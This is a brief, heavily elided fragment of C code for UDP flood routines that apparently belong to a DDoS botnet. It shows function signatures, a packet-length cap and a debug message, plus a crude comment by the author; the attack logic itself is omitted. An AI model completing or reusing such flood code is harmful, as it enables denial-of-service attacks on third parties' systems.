...
void attack_udp_stdhex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) // Shot by gay
{
    int i;
...
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    if (data_len > 1460) {
        data_len = 1460;
        #ifdef DEBUG
            printf("len is more then 1460, using %d\n", data_len);
        #endif
